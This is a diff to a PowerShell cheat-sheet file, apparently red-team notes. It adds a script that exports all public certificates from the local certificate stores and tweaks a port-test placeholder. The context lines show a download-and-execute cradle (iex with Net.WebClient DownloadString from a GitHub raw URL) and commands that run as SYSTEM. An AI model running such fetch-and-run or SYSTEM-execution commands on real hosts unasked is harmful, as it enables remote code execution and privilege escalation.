@@ -45,7 +45,7 @@ iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 
 # Test on open/close port
 ```powershell
-Test-NetConnection -Port 389 -InformationLevel "Detailed" <ip> 
+Test-NetConnection -Port 389 -InformationLevel "Detailed" [ip]
 ```
 
 ## Use a data structure for frequently used options
@@ -253,3 +253,60 @@ Invoke-InteractiveSystemPowerShell
 Invoke-SystemCommand -Execute "powershell.exe" -Argument "whoami \| Out-File C:\result.txt"
 ```
 
+# Export all X.509 certificates from all stores on localhost
+
+```powershell
+# Define a flat output directory for all certificates
+$outputDir = ".\certs\"
+New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
+
+# Define the registry locations for certificate stores
+$storeLocations = @{
+    "CurrentUser"  = "HKCU:\Software\Microsoft\SystemCertificates"
+    "LocalMachine" = "HKLM:\Software\Microsoft\SystemCertificates"
+}
+
+# Build dynamic list of available stores
+$stores = @()
+foreach ($location in $storeLocations.Keys) {
+    Get-ChildItem -Path $storeLocations[$location] | ForEach-Object {
+        $stores += @{ Name = $_.PSChildName; Location = $location }
+    }
+}
+
+# Track thumbprints to avoid overwriting duplicates
+$exportedThumbprints = @{}
+
+# Export certificates from all discovered stores
+foreach ($store in $stores) {
+    $storeName = $store.Name
+    $storeLocation = $store.Location
+
+    $storeObj = New-Object System.Security.Cryptography.X509Certificates.X509Store($storeName, $storeLocation)
+    try {
+        $storeObj.Open("ReadOnly")
+    } catch {
+        Write-Warning "Failed to open store $storeName at $storeLocation"
+        continue
+    }
+
+    foreach ($cert in $storeObj.Certificates) {
+        $thumbprint = $cert.Thumbprint.Replace(" ", "")
+        
+        # Skip if already exported
+        if ($exportedThumbprints.ContainsKey($thumbprint)) {
+            continue
+        }
+
+        $filename = Join-Path $outputDir "$thumbprint.cer"
+        $bytes = $cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Cert)
+        [System.IO.File]::WriteAllBytes($filename, $bytes)
+
+        $exportedThumbprints[$thumbprint] = $true
+    }
+
+    $storeObj.Close()
+}
+
+Write-Output "`nAll certificates exported to: $outputDir"
+```
